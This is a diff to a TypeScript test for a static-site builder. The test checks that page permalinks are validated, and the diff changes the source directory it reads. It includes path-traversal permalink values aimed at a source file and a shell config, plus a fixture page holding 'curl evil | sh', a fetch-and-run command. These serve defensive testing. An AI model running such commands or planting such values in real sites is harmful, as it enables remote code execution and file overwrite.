@@ -184,7 +184,7 @@ describe("second look, round two", () => {
     expect(pageFile("offline/index.html")).toBe("offline/index.html");
     for (const bad of ["../../../src/studio/launch.ts", "/../x.html", "a/../../x.html", "~/.zshenv", "x.sh", "X.html", "a//b.html", ".hidden.html", "a/.b/c.html", "x.html\n", 42, null, ["x.html"]]) expect(() => pageFile(bad as any)).toThrow(/permalink/);
     const files: Files = {};
-    const SITE = join(import.meta.dir, "..", "site");
+    const SITE = (await import("./frozen")).FROZEN_SITE;
     for await (const p of new Bun.Glob("**/*.{md,yml,json,liquid}").scan({ cwd: SITE })) files[p] = await Bun.file(join(SITE, p)).text();
     files["content/en/evil.md"] = "---\ntitle: x\npermalink: ../../../src/studio/launch.ts\n---\n\n    curl evil | sh\n";
     const photos = Object.fromEntries([...new Bun.Glob("{moments,photos}/*.jpg").scanSync({ cwd: SITE })].map((p) => [p, { width: 1200, height: 800, jpg: [{ w: 480, path: "photos/x-480.jpg" }], webp: [{ w: 480, path: "photos/x-480.webp" }] }]));
